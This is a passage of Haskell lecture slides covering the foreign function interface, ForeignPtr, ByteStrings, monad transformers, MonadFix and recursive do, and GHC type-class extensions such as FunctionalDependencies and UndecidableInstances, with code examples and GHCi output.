
   # Working with `ForeignPtr`s

   * To use `ForeignPtr`, must convert it to `Ptr`
       * Problem: How does GC know `ForeignPtr` in scope when using
         `Ptr`?
       * Solution: use `Ptr` within function that keeps reference to
         `ForeignPtr`

       ~~~~ {.haskell}
       withForeignPtr :: ForeignPtr a -> (Ptr a -> IO b) -> IO b
       ~~~~

   * Can also convert `Ptr`s to `ForeignPtr`s

       ~~~~ {.haskell}
       type FinalizerPtr a = FunPtr (Ptr a -> IO ())
       newForeignPtr :: FinalizerPtr a -> Ptr a
                     -> IO (ForeignPtr a)
       newForeignPtr_ :: Ptr a -> IO (ForeignPtr a)
       addForeignPtrFinalizer :: FinalizerPtr a -> ForeignPtr a
                              -> IO ()
       ~~~~

       * Can add multiple finalizers, will run in reverse order
   * Note use of `FunPtr` -- this is type wrapper for C function pointer
       * Need foreign function interface to create these
       * [`finalizerFree`][finalizerFree] symbol conveniently provides
         function pointer for `free`

   # [Foreign function interface][FFI] (FFI)

   * Can import foreign functions like this:

       ~~~~ {.haskell}
       foreign import ccall unsafe "stdlib.h malloc"
           c_malloc :: CSize -> IO (Ptr a)
       foreign import ccall unsafe "stdlib.h free"
           c_free :: Ptr a -> IO ()
       ~~~~

       * `ccall` says use C calling convention (also `cplusplus` and few
         others)
       * `unsafe` promises the C function will not call back into
         Haskell
       * `unafe` faster than `safe`, but gives undefined results if call
         triggers GC
   * Spec for import string: `"`[`static`] [*c-header*] [`&`][*c-name*]`"`
       * `static` required only if *c-name* is `dynamic` or `wrapper`
       * *c-header* is a single `.h` file with the declaration
          (ignored by GHC)
       * '&' imports pointer rather than function (required for `FunPtr`s)


   # FFI types

   * FFI function arguments must be *basic foreign types*
       * `Char`, `Int`, `Double`, `Float`, `Bool`, `Int8`, `Int16`,
         `Int32`, `Int64`, `Word8`, `Word16`, `Word32`, `Word64`, `Ptr`
         `a`, `FunPtr a`, and `StablePtr a`
       * Also accepts any `type` or `newtype` wrappers for basic types
         (`CInt`, `CChar`, etc.)<br/>
         [Documentation incorrectly says `data CInt`, but `:i` in GHCI
         reveals truth.]
   * FFI function results can be
       * Any valid argument type
       * `()` (for functions returning `void`)
       * `IO a` where `a` is either of the above two
   * Place result `IO` if function has side effects or non-determinism
       * Okay to omit if it is a pure C function:

           ~~~~ {.haskell}
           foreign import ccall unsafe "arpa/inet.h ntohl"
               ntohl :: Word32 -> Word32
           ~~~~

       * Haskell can't check C purity, so omitting `IO` can cause
         problems

   # [`hsc2hs`][hsc2hs]

   * How to access C data structures?

       ~~~~ {.c}
       struct mystruct {
         char *name;
         int value;
       };
       ~~~~

       * Might model with opaque placeholder type

       ~~~~ {.haskell}
       data MyStruct        -- no constructors, just a placeholder
       getValue :: Ptr MyStruct -> IO CInt
       getValue ptr = peek $ ptr `plusPtr` 8  -- assumes char * 8 bytes
       ~~~~

   * [`hsc2hs`][hsc2hs] is pre-processor that lets you compute C values

       ~~~~ {.haskell}
       #include "myheader.h"
       getValue ptr = peek $ ptr `plusPtr`
                      #{offset struct mystruct, value}
       ~~~~

       * Super-simple implementation just uses C macros & `printf`
       * Find the file [`template-hsc.h`][template-hsc.h] on your system
         to see defs of `#` commands
       * Can also define your own macros with `#let` (like `#define` w/o
         parens)

   -->

.. _bytestringsbytestring:

ByteStrings
==============

-  Haskell ``String`` s obviously not very efficient

-  Strict ``ByteString`` s efficiently manipulate raw bytes

   .. code:: haskell

      import qualified Data.ByteString as S
      import qualified Data.ByteString.Char8 as S8

   -  Implements a similar interface to lists: ``S.head``, ``S.tail``,
      ``S.length``, ``S.foldl``, ``S.cons`` (like ``:``), ``S.empty``
      (like ``[]``), ``S.hPut`` (like ``hPutStr``), ``S.readFile``
   -  Must import qualified to avoid name clashes
   -  ``S.pack`` and ``S.unpack`` translate to/from ``[Word8]``
   -  ``S8`` has same functions as ``S``, but uses ``Char`` instead of
      ``Word8``–means you lose upper bits of ``Char`` (use
      ```toString`` <http://hackage.haskell.org/packages/archive/utf8-string/0.3.7/doc/html/Data-ByteString-UTF8.html#v:toString>`__
      from
      `utf8-string <http://hackage.haskell.org/package/utf8-string>`__
      to avoid loss)

-  Implementation

   .. code:: haskell

      data ByteString = PS {-# UNPACK #-} !(ForeignPtr Word8)
                           {-# UNPACK #-} !Int  -- offset
                           {-# UNPACK #-} !Int  -- length

.. _lazy-bytestringsbytestring.lazy:

Lazy ByteStrings
=================

-  Same package implements `lazy
   ``ByteString`` s <http://www.haskell.org/ghc/docs/latest/html/libraries/bytestring-0.10.4.0/Data-ByteString-Lazy.html>`__

   .. code:: haskell

      import qualified Data.ByteString.Lazy as L
      import qualified Data.ByteString.Lazy.Char8 as L8

   -  Provides mostly the same functions as strict ``ByteString``
      modules

-  Confusing that both modules use same names for many things

   -  Important to look at import qualifications to understand code
   -  Worse: documentation does not qualify symbol names Tip: **hover
      your mouse over symbol and look at URL to figure out module**
   -  Also, ``S.ByteString`` and ``S8.ByteString`` are the same type
      (re-exported), and similarly for ``L.ByteString`` and
      ``L8.ByteString``
   -  ``S.ByteString`` and ``L.ByteString`` *not* same type, but can
      convert:

   .. code:: haskell

      fromChunks :: [S.ByteString] -> L.ByteString
      toChunks :: L.ByteString -> [S.ByteString]

Lazy ``ByteString`` implementation
==================================

-  Lazy ``ByteString`` s are implemented in terms of strict ones

   .. code:: haskell

      data ByteString = Empty
                      | Chunk {-# UNPACK #-} !S.ByteString ByteString

   -  Invariant: ``Chunk`` ’s first argument (``S.ByteString``) never
      ``null``
   -  Basically a linked list of strict ``ByteString`` s
   -  Head is strict, tail is not, allowing lazy computation or I/O

-  When to use strict/lazy ``ByteString`` s?

   -  Obviously use lazy when you need laziness (e.g., lazy I/O,
      infinite or cyclical strings, etc.)
   -  Lazy also much faster at concatenation (need to build a new list
      of ``S.ByteString`` s, but not copy the data they contain)
   -  Strict makes it much easier to implement things like string search
   -  Converting strict to lazy ``ByteString`` s is cheap, reverse is
      not (so if a library can work efficiently on lazy
      ``ByteString`` s, good to expose that functionality)


/L7 GHC Language extensions
===========================

-  GHC implements many extensions to Haskell, enabled by

   -  Placing ``{-# LANGUAGE`` *ExtensionName* ``#-}`` at top of file
      (recommended)
   -  Compiling with ``-X`` *ExtensionName* (less recommended, except
      for ``-XSafe``)
   -  Typing ``:set -X`` *ExtensionName* at ``ghci`` prompt (or running
      ``ghci`` with ``-X`` …)

-  Complete list at `Language options <http://www.haskell.org/ghc/docs/latest/html/users_guide/flag-reference.html#idp14594128>`__
   section of GHC’s option summary
-  Some extensions are very safe to use

   -  E.g., core libraries depend on extension in a deep way
   -  Extension very superficial, easily de-sugars into Haskell2010

-  Other extensions less widely accepted

   -  E.g., makes type inference/checking undecidable or
      non-deterministic
   -  Undermines type safety
   -  A work in progress that could never be incorporated into standard

-  Many extensions in a middle/gray area

Background: Monad transformers
==============================

-  Type constructors building monads parameterized by other monads

   -  Method
      ```lift`` <http://hackage.haskell.org/packages/archive/transformers/latest/doc/html/Control-Monad-Trans-Class.html#t:MonadTrans>`__
      executes actions from underlying transformed monad:

   .. code:: haskell

      class MonadTrans t where
          lift :: Monad m => m a -> t m a

   -  Note monads have kind ∗ → ∗, so transformers have kind (∗ → ∗) → ∗
      → ∗

-  Example: State transformer monad,
   ```StateT`` <http://hackage.haskell.org/packages/archive/transformers/latest/doc/html/Control-Monad-Trans-State-Lazy.html#v:StateT>`__

   .. code:: haskell

      newtype StateT s m a = StateT { runStateT :: s -> m (a,s) }

      instance (Monad m) => Monad (StateT s m) where
          return a = StateT $ \s -> return (a, s)
          m >>= k  = StateT $ \s0 -> do          -- in monad m
                       ~(a, s1) <- runStateT m s0
                       runStateT (k a) s1

      instance MonadTrans (StateT s) where
          lift ma = StateT $ \s -> do            -- in monad m
                      a <- ma
                      return (a, s)

Using ``StateT``
================

-  ``get`` and ``put`` allow you to modify state

   .. code:: haskell

      get :: (Monad m) => StateT s m s
      put :: (Monad m) => s -> StateT s m ()

-  Example: Haskell equivalent of ``x++`` in C

   .. code:: haskell

      import Control.Monad.Trans
      import Control.Monad.Trans.State

      main :: IO ()
      main = runStateT go 0 >>= print
        where go = do xplusplus >>= lift . print
                      xplusplus >>= lift . print
              xplusplus = do n <- get; put (n + 1); return n

   ::

      *Main> main
      0
      1
      ((),2)

.. raw:: html

   <!--
   # More complex `StateT` example

   * Example: count lines of standard input

       ~~~~ {.haskell}
       import Control.Exception
       import Control.Monad
       import Control.Monad.Trans
       import Control.Monad.Trans.State

       countLines :: IO Int
       countLines = liftM fst $ runStateT go (0::Int)
         where go = lift (try getLine) >>= doline
               doline (Left (SomeException _)) = get
               doline (Right _) = do n <- get; put (n + 1); go
       ~~~~

       * Note that `try getLine` is an `IO` action, executed with `lift`
       * Mixed with `IO` are `get`, `set` actions from `StateT Int IO` monad
   -->

Exercise: Implement ``get`` and ``put``
=======================================

-  Recall ``StateT`` implementation

.. code:: haskell

   newtype StateT s m a = StateT { runStateT :: s -> m (a,s) }

   instance (Monad m) => Monad (StateT s m) where
       return a = StateT $ \s -> return (a, s)
       m >>= k  = StateT $ \s0 -> do          -- in monad m
                    ~(a, s1) <- runStateT m s0
                    runStateT (k a) s1

-  How to implement the following?

.. code:: haskell

   get :: (Monad m) => StateT s m s


   put :: (Monad m) => s -> StateT s m ()

.. _exercise-implement-get-and-put-1:

Exercise: Implement ``get`` and ``put``
=======================================

-  Recall ``StateT`` implementation

.. code:: haskell

   newtype StateT s m a = StateT { runStateT :: s -> m (a,s) }

   instance (Monad m) => Monad (StateT s m) where
       return a = StateT $ \s -> return (a, s)
       m >>= k  = StateT $ \s0 -> do          -- in monad m
                    ~(a, s1) <- runStateT m s0
                    runStateT (k a) s1

-  How to implement the following?

.. code:: haskell

   get :: (Monad m) => StateT s m s
   get = StateT $ \s -> return (s, s)

   put :: (Monad m) => s -> StateT s m ()
   put s = StateT $ \_ -> return ((), s)

The ``MonadIO`` class
=====================

-  Sometimes want to execute IO regardless of current monad

.. code:: haskell

   class (Monad m) => MonadIO m where
       liftIO :: IO a -> m a

   instance MonadIO IO where
       liftIO = id

-  Let’s make ``liftIO`` work for ``StateT``

   .. code:: haskell

      instance (MonadIO m) => MonadIO (StateT s m) where
          liftIO = lift . liftIO

-  Now can write functions that use IO and work in many monads:

   .. code:: haskell

      myprint :: (Show a, MonadIO m) => a -> m ()
      myprint a = liftIO $ print $ show a

-  All standard Monad transformers implement class ``MonadIO``

   -  ``ContT``, ``ErrorT``, ``ListT``, ``RWST``, ``ReaderT``,
      ``StateT``, ``WriterT``, …

Background: recursive bindings
==============================

-  Top-level, ``let``, and ``where`` bindings are all recursive in
   Haskell, e.g.:

   .. code:: haskell

      oneTwo :: (Int, Int)
      oneTwo = (fst y, snd x)
          where x = (1, snd y)    -- mutual recursion
                y = (fst x, 2)

      nthFib :: Int -> Integer
      nthFib n = fibList !! n
          where fibList = 1 : 1 : zipWith (+) fibList (tail fibList)

-  Recursion can be implemented using a fixed-point combinator

   -  Function
      ```fix`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Function.html#v:fix>`__
      calls a function with its own result, use to re-implement above:

      .. code:: haskell

         fix :: (a -> a) -> a
         fix f = let x = f x in x

      .. code:: haskell

         oneTwo' :: (Int, Int)
         oneTwo' = (fst y, snd x)
             where (x, y) = fix $  ~(x0, y0) -> let x1 = (1, snd y0)
                                                     y1 = (fst x0, 2)
                                                 in (x1, y1)
         nthFib' n = fibList !! n
             where fibList = fix $ \l -> 1 : 1 : zipWith (+) l (tail l)

Recursion and monadic bindings
==============================

-  By contrast, monadic bindings are *not* recursive

   .. code:: haskell

      do fibList <- return $ 1 : 1 : zipWith (+) fibList (tail fibList)
         ...     -- error, fibList not in scope  ^^^^^^^       ^^^^^^^

-  But monads in the
   ```MonadFix`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Monad-Fix.html#t:MonadFix>`__
   class have a fixed-point combinator

   .. code:: haskell

      class Monad m => MonadFix m where
          mfix :: (a -> m a) -> m a

   -  ``mfix`` can be used to implement recursive monadic bindings
      `[Erkök00] <http://citeseer.ist.psu.edu/viewdoc/download;jsessionid=13851C3A2D4F33918B9D662C20F30762?doi=10.1.1.43.5313&rep=rep1&type=pdf>`__,
      e.g.:

   .. code:: haskell

      mfib :: (MonadFix m) => Int -> m Integer
      mfib n = do
        fibList <- mfix $ \l -> return $ 1 : 1 : zipWith (+) l (tail l)
        return $ fibList !! n -- ^^^^^

-  Why? E.g., might want to simulate circuits with monads

   -  Need recursion if there is a loop in your circuit
   -  Might want recursion anyway to avoid worrying about order of
      statements

The RecursiveDo extension
=========================

http://www.haskell.org/ghc/docs/latest/html/users_guide/syntax-extns.html#recursive-do-notation

-  New ``rec`` keyword introduces recursive bindings in a ``do`` block
   `[Erkök02] <https://sites.google.com/site/leventerkok/recdo.pdf?attredirects=0>`__

   -  Monad must be an instance of ``MonadFix`` (``rec`` desugars to
      ``mfix`` calls)

   .. code:: haskell

      oneTwo'' :: (MonadFix m) => m (Int, Int)
      oneTwo'' = do
        rec x <- return (1, snd y)
            y <- return (fst x, 2)
        return (fst y, snd x)

   -  Desugars to:

   .. code:: haskell

      oneTwo''' :: (MonadFix m) => m (Int, Int)
      oneTwo''' = do
        (x, y) <- mfix $  ~(x0, y0) -> do x1 <- return (1, snd y0)
                                           y1 <- return (fst x0, 2)
                                           return (x1, y1)
        return (fst y, snd x)

-  In practice ``RecursiveDo`` helps structure thinking

   -  Then can manually desugar rather than require a language extension
   -  But ``mfix`` on its own is quite useful

Example uses of ``mfix`` and ``rec``
====================================

-  Create recursive data structures in one shot

   .. code:: haskell

      data Link a = Link !a !(MVar (Link a)) -- note ! is okay

      mkCycle :: IO (MVar (Link Int))
      mkCycle = do
        rec l1 <- newMVar $ Link 1 l2        -- but $! would diverge
            l2 <- newMVar $ Link 2 l1
        return l1

-  Call non-strict methods of classes (easy access to return-type
   dictionary)

   .. code:: haskell

      class MyClass t where
          myTypeName :: t -> String        -- non-strict in argument
          myDefaultValue :: t
      instance MyClass Int where
          myTypeName _ = "Int"
          myDefaultValue = 0

      getVal :: (MyClass t) => IO t
      getVal = mfix $ \t -> do      -- doesn't use mfix's full power
        putStrLn $ "Caller wants type " ++ myTypeName t
        return myDefaultValue

Implementing ``mfix``
=====================

-  Warm-up: The
   ```Identity`` <http://hackage.haskell.org/packages/archive/transformers/latest/doc/html/Data-Functor-Identity.html#v:Identity>`__
   monad

   .. code:: haskell

      newtype Identity a = Identity { runIdentity :: a }
      instance Monad Identity where
          return = Identity
          m >>= k = k (runIdentity m)

   -  ``newtype`` compiles to nothing, so basically same as ``fix``:

   .. code:: haskell

      instance MonadFix Identity where
          mfix f = let x = f (runIdentity x) in x

``fixIO`` – ``IO`` Monad fixed point
====================================

-  Internally, lazy IO is implemented by magic
   ```unsafeInterleaveIO`` <http://hackage.haskell.org/package/base-4.7.0.0/docs/System-IO-Unsafe.html#v:unsafeInterleaveIO>`__

   .. code:: haskell

      unsafeInterleaveIO :: IO a -> IO a

   -  Looks like an ``IO`` identify function, but defers IO until the
      thunk forced

   -  Danger–don’t try this at home! No longer a functional language

      .. code:: haskell

         weird :: IO String
         weird = do
           xxx <- unsafeInterleaveIO $ do putStrLn "Gotcha!"; return []
           return $ 'a':'b':'c':xxx

-  For ``IO``, ``mfix = fixIO``:

   .. code:: haskell

      fixIO :: (a -> IO a) -> IO a
      fixIO k = do
          ref <- newIORef (throw NonTermination)
          ans <- unsafeInterleaveIO (readIORef ref)
          result <- k ans
          writeIORef ref result
          return result

   -  This is quite similar to what the compiler does for pure ``fix``

A generic ``mfix`` is not possible
==================================

-  What if we tried to define an ``mfix``-like function for all monads?

   .. code:: haskell

      mbroken :: (Monad m) => (a -> m a) -> m a -- equivalent to mfix?
      mbroken f = fix (>>= f)

   -  This is equivalent to

   .. code:: haskell

      mbroken f = mbroken f >>= f

   -  But ``>>=`` is strict in its first argument for many monads, so

   ::

      *Main> mfix $ const (return 0)
      0
      *Main> mbroken $ const (return 0)
      *** Exception: stack overflow

-  So ``mfix`` needs to take fixed point over value, not over monadic
   action

   -  How to do this is monad-specific
   -  Doesn’t work for all monads (``ContT``, ``ListT``)

``MonadFix`` instance for ``StateT``
====================================

-  What about the
   ```StateT`` <http://hackage.haskell.org/packages/archive/transformers/latest/doc/html/Control-Monad-Trans-State-Lazy.html#t:StateT>`__
   monad?

   .. code:: haskell

      newtype StateT s m a = StateT { runStateT :: s -> m (a,s) }

      instance (Monad m) => Monad (StateT s m) where
          return a = StateT $ \s -> return (a, s)
          m >>= k  = StateT $ \s0 -> do          -- in monad m
                       ~(a, s1) <- runStateT m s0
                       runStateT (k a) s1

   -  Possibly easiest to see using ``rec`` notation

   .. code:: haskell

      instance MonadFix m => MonadFix (StateT s m) where
          mfix f = StateT $ \s0 -> do            -- in monad m
                     rec ~(a, s1) <- runStateT (f a) s0
                     return (a, s1)

   -  But easily implemented with no language extensions

   .. code:: haskell

      instance MonadFix m => MonadFix (StateT s m) where
          mfix f = StateT $ \s -> mfix $  ~(a, _) -> runStateT (f a) s

Review: Type classes
====================

-  A `Haskell 2010 type class
   declaration <http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-760004.3.1>`__
   can take the form:

   .. code:: haskell

      class ClassName var where
          methodName :: Type {- where type references var -}

   .. code:: haskell

      class (SuperClass var) => ClassName var where ...
      class (Super1 var, Super2 var) => ClassName var where ...
      ...

   -  Note that ``var`` need not have kind ∗

   -  However, the type of each method must mention ``var`` and an
      implicit ``(Classname var)`` is added to the context of each
      method, e.g.:

      .. code:: haskell

         Prelude> :t return
         return :: Monad m => a -> m a

-  A `Haskell 2010 instance
   declaration <http://www.haskell.org/onlinereport/haskell2010/haskellch4.html#x10-770004.3.2>`__
   has the form:

   .. code:: haskell

      instance [context =>] ClassName (TypeCon v1 ... vk) where ...

   -  Note ``v1`` … ``vk`` are all variables and all distinct, ruling
      out, e.g., ``instance C (a,a)`` or ``instance C (Int a)`` or
      ``instance [[a]]``

MultiParamTypeClasses extension
===============================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#id559142

-  Enables type classes with multiple parameters, E.g.:

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}
      class Convert a b where convert :: a -> b
      instance Convert Int Bool where convert = (/= 0)
      instance Convert Int Integer where convert = toInteger
      instance (Convert a b) => Convert [a] [b] where
          convert = map convert

-  Extension itself is relatively safe, but encourages other extensions

   -  E.g., each method’s type must use every type parameter

      .. code:: haskell

         class MyClass a b where
             aDefault :: a  -- can never use (without more extensions...)

   -  All types (argument and return) must be fully determined

      .. code:: haskell

                convert 0 :: Bool   -- error, 0 has type (Num a) => a

   -  And the usual instance restrictions still apply

      .. code:: haskell

         instance Convert Int [Char] where convert = show  -- error bad param

      -  ``[Char]``–i.e., ``([] Char)``–is not a valid instance
         parameter, would have to be ``([] a)``

```FlexibleInstances`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#instance-decls>`__ extension
=======================================================================================================================================

-  Allows more specific type paremeters (relatively safe extension)

   -  E.g., now we can say:

   .. code:: haskell

      {-# LANGUAGE FlexibleInstances #-}

      instance Convert Int [Char] where
          convert = show

   -  And we can make all types convert to themselves:

   .. code:: haskell

      instance Convert a a where convert a = a

   ::

      *Main> convert () :: ()
      ()
      *Main> convert ([1,2,3]::[Int]) :: [Integer]
      [1,2,3]
      *Main> convert ([1,2,3]::[Int]) :: [Int]
      <interactive>:1:1:
          Overlapping instances for Convert [Int] [Int]
            instance Convert a a
            instance Convert a b => Convert [a] [b]

   -  Oops, two instances apply; GHC doesn’t know which to choose

OverlappingInstances extension
==============================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#instance-overlap

-  This extension is used, but also widely frowned upon

   -  Only need this extension if overlapping instances actually used
   -  Enable extension where instances defined, not where used
   -  Compiler picks the most specific matching instance. :math:`I_1` is
      more specific than :math:`I_2` when :math:`I_1` can be created by
      substituting for the variables of :math:`I_2` and not vice versa
   -  Contexts (part before ``=>``) not considered when selecting
      instances

-  Example: Do something like ``Show`` for ``String`` vs. ``[a]``

   .. code:: haskell

      class MyShow a where myShow :: a -> String
      instance MyShow Char where myShow = show
      instance MyShow Int where myShow = show
      instance MyShow [Char] where myShow = id
      instance (MyShow a) => MyShow [a] where
          myShow []     = "[]"
          myShow (x:xs) = "[" ++ myShow x ++ go xs
              where go (y:ys) = "," ++ myShow y ++ go ys
                    go []     = "]"

-  So does enabling ``OverlappingInstances`` fix ``Convert``?

Most specific instances
=======================

-  What is the most specific instance?

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}
      {-# LANGUAGE FlexibleInstances #-}
      {-# LANGUAGE OverlappingInstances #-}
      instance Convert a a where ...
      instance (Convert a b) => Convert [a] [b] where ...

   ::

      *Main> convert ([1,2,3]::[Int]) :: [Int]
      <interactive>:1:1:
          Overlapping instances for Convert [Int] [Int]
            instance [overlap ok] Convert a a
            instance [overlap ok] Convert a b => Convert [a] [b]

   -  Neither instance is most specific!
   -  We have to add a *third* instance to break the tie–one that can be
      created by substituting for variables in either of the other two
      overlapping instances

   .. code:: haskell

      instance Convert [a] [a] where convert = id

   ::

      *Main> convert ([1,2,3]::[Int]) :: [Int]
      [1,2,3]

A case against ``OverlappingInstances``
=======================================

.. code:: haskell

   module Help where
       class MyShow a where
         myshow :: a -> String
       instance MyShow a => MyShow [a] where
         myshow xs = concatMap myshow xs

       showHelp :: MyShow a => [a] -> String
       showHelp xs = myshow xs     -- doesn't see overlapping instance

   module Main where
       import Help

       data T = MkT
       instance MyShow T where
         myshow x = "Used generic instance"
       instance MyShow [T] where
         myshow xs = "Used more specific instance"

       main = do { print (myshow [MkT]); print (showHelp [MkT]) }

::

   *Main> main
   "Used more specific instance"
   "Used generic instance"

Aside: How ``Show`` actually works
==================================

-  Add an extra helper method, ``showList``, with a default definition:

.. code:: haskell

   class Show a where
     show :: a -> String
     showList :: [a] -> ShowS
     showList as = '[' : intercalate ", " (map show as) ++ "]"
     -- Note actual implementation more efficient but equivalent

   instance (Show a) => Show [a] where
     show as = showList as

-  ``Show`` instance for ``Char`` overrides default ``showList``

-  But had to plan all this out from the start

   -  Want an easy way to special-case trees or other data structures
      besides lists?
   -  Then you are stuck using overlapping instances

FlexibleContexts extension
==========================

http://www.haskell.org/ghc/docs/latest/html/users_guide/other-type-extensions.html#flexible-contexts

-  ``MultiParamTypeClasses`` leads to inexpressible types

   .. code:: haskell

      toInt val = convert val :: Int

   -  What is the type of function ``toInt``? Would like to write:

   .. code:: haskell

      toInt :: (Convert a Int) => a -> Int

   -  But ``(Convert a Int) =>`` is an illegal context, as ``Int`` not a
      type variable

-  ``FlexibleContexts`` extension makes the above type legal to write

   -  Is a relatively safe extension to use

-  Still a couple of restrictions

   -  Each type variable in context must be “reachable” from a type
      variable in type (Reachable = explicitly used, or in another
      constraint with a reachable variable.)

      .. code:: haskell

         sym :: forall a. Eq a => Int   -- illegal

   -  Every constraint must have a type variable

      .. code:: haskell

         sym :: Eq Int => Bool          -- illegal

Monad classes
=============

-  It’s neat that ``liftIO`` works from so many monads

   -  Why not do something similar for ``StateT``? Make ``get``/``set``
      methods

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}
      {-# LANGUAGE FlexibleInstances #-}

      class (Monad m) => MonadState s m where
          get :: m s
          put :: s -> m ()
      instance (Monad m) => MonadState s (StateT s m) where
          get = StateT $ \s -> return (s, s)
          put s = StateT $ \_ -> return ((), s)

-  Now for each other ``MonadTrans``, pass requests down

   -  This is just like ``liftIO``. E.g., for ``ReaderT``:

   .. code:: haskell

      instance (MonadIO m) => MonadIO (ReaderT r m) where
          liftIO = lift . liftIO

      instance (MonadState s m) => MonadState s (ReaderT r m) where
          get = lift get
          put = lift . put

Problem: we’ve defeated type inference
======================================

-  Remember ``xplusplus``?

   .. code:: haskell

              xplusplus = do n <- get; put (n + 1); return n

   -  The compiler knows we are in ``StateT Int IO`` monad

   -  So can infer that the type of ``get`` is
      ``Num s => StateT Int IO s``

   -  But need to know ``s`` in order to select an instance of
      ``MonadState``!

   -  For all compiler knows, might be other matching instances, e.g.,

      .. code:: haskell

         instance MonadState Double (StateT Int IO) where
             -- would be legal, but exists only in compiler's imagination

-  Since compiler can’t infer return type of ``get``, must type it
   manually:

   .. code:: haskell

          xplusplus = do n <- get :: StateT Int IO Int
                         put (n + 1)
                         return n

   -  Yuck! Lack of type inference gets old fast!

FunctionalDependencies extension
================================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#functional-dependencies

-  Widely used & frowned upon (not as bad as ``OverlappingInstances``)

   -  Also referred to as “fundeps”

-  Lets a class declare some parameters to be functions of others

   .. code:: haskell

      class (Monad m) => MonadState s m | m -> s where
          get :: m s
          put :: s -> m ()

   -  The best way to think of this is in terms of *instance selection*
   -  “``| m -> s``” says can select an instance based on ``m`` without
      considering ``s``, because **``s`` is a function of ``m``**
   -  Once you’ve selected the instance, you can use ``s`` for type
      inference

-  Disallows conflicting instances (even w. ``OverlappingInstances``)

-  Also allows arbitrary computation at the type level
   `[Hallgren] <http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=D19C7E3BD1B5C1FC24035542B1494ED9?doi=10.1.1.22.7806&rep=rep1&type=pdf>`__

   -  But language committee wants compilation to be decidable and
      deterministic
   -  So need to add some restrictions

.. _sufficient-conditions-of-decidable-instancesinstancerules:

Sufficient conditions of decidable instances
=============================================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#instance-rules

-  Anatomy of an instance: ``instance`` [*context* ``=>``] *head*
   [``where`` *body*]

   -  *context* consists of zero or more comma-separated *assertions*

1. The Paterson Conditions: for each assertion in the context

   a. No type variable has more occurrences in the assertion than in the
      head

      .. code:: haskell

         class Class a b
         instance (Class a a) => Class [a] Bool  -- bad: 2 * a > 1 * a
         instance (Class a b) => Class [a] Bool  -- bad: 1 * b > 0 * b

   b. The assertion has fewer constructors and variables than the head

      .. code:: haskell

         instance (Class a Int) => Class a Integer   -- bad: 2 >= 2

2. The Coverage Condition: For each fundep *left* ``->`` *right*, the
   types in *right* cannot have type variables not mentioned in *left*

   .. code:: haskell

      class Class a b | a -> b
      instance Class a (Maybe a)       -- ok: a "covered" by left
      instance Class Int (Maybe b)     -- bad: b not covered
      instance Class a (Either a b)    -- bad: b not covered

Undecidable vs. exponential – who cares?
========================================

-  Editorial: maybe decidability of language is overrated

   -  Computers aren’t Turing machines with infinite tapes, after all

-  This legal, decidable program will crash your Haskell compiler

   .. code:: haskell

      crash = f5 ()
          where f0 x = (x, x)      -- type size 2^{2^0}
                f1 x = f0 (f0 x)   -- type size 2^{2^1}
                f2 x = f1 (f1 x)   -- type size 2^{2^2}
                f3 x = f2 (f2 x)   -- type size 2^{2^3}
                f4 x = f3 (f3 x)   -- type size 2^{2^4}
                f5 x = f4 (f4 x)   -- type size 2^{2^5}

-  While plenty of not provably decidable programs happily compile

   -  The conditions of the last slide are *sufficient*, not *necessary*
   -  Might have other ways of knowing your program can compile
   -  Or maybe figure it out from trial and error?

UndecidableInstances extension
=================================

http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#undecidable-instances

-  Lifts the Paterson and Coverage conditions

   -  Also enables ``FlexibleContexts`` when enabled

-  Instead, imposes a maximum recursion depth

   -  Default maximum depth is 20

   -  Can increase with ``-fcontext-stack=`` *n* option, e.g.:

      .. code:: haskell

         {-# OPTIONS_GHC -fcontext-stack=1024 #-}
         {-# LANGUAGE UndecidableInstances #-}

-  A bit reminiscent of C++ templates

   -  gcc has a ``-ftemplate-depth=`` option
   -  Note C++11 raises minimum depth from 17 to 1024
   -  Similarly, people have talked of increasing GHC’s default
      context-stack

``MonadIO`` revisited
=====================

-  Recall definition of ``MonadIO``

   .. code:: haskell

      class (Monad m) => MonadIO m where
          liftIO :: IO a -> m a
      instance MonadIO IO where
          liftIO = id

-  Currently must define an instance for every transformer

   .. code:: haskell

      instance MonadIO m => MonadIO (StateT s m) where liftIO = lift . liftIO
      instance MonadIO m => MonadIO (ReaderT t m) where liftIO = lift . liftIO
      instance MonadIO m => MonadIO (WriterT w m) where liftIO = lift . liftIO
      ...

-  With ``UndecidableInstances``, one instance can cover all
   transformers!

   .. code:: haskell

      {-# LANGUAGE FlexibleInstances #-}
      {-# LANGUAGE UndecidableInstances #-}

      -- undecidable: assertion Monad (t m) no smaller than head
      instance (MonadTrans t, MonadIO m, Monad (t m)) =>
          MonadIO (t m) where liftIO = lift . liftIO

Summary of extensions
=====================

-  We’ve seen 6 typeclass-related extensions

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}  -- very conservative
      {-# LANGUAGE FlexibleInstances #-}      -- conservative
      {-# LANGUAGE FlexibleContexts #-}       -- conservative
      {-# LANGUAGE FunctionalDependencies #-} -- frowned upon
      {-# LANGUAGE UndecidableInstances #-}   -- very frowned upon
      {-# LANGUAGE OverlappingInstances #-}   -- the most controversial

   -  Not all of these are looked upon kindly by the community
   -  But if you enable all six, can be very powerful

-  Remainder of lecture looks at what you can do with all 6 enabled

   -  Much inspired by
      `[Hlist] <http://homepages.cwi.nl/~ralf/HList/paper.pdf>`__ and
      `[OOHaskell] <http://homepages.cwi.nl/~ralf/OOHaskell/paper.pdf>`__

.. raw:: html

   <!--
   # Type-level natural numbers


   ~~~~ {.haskell}
   data Zero = Zero      -- Type-level 0
   data Succ n = Succ n  -- Type-level successor (n + 1)

   class NatPlus a b c | a b -> c, a c -> b where
       natPlus :: a -> b -> c
       natMinus :: c -> a -> b

   instance NatPlus Zero a a where
       natPlus _ a = a
       natMinus a _ = a

   -- Note failure of coverage condition below
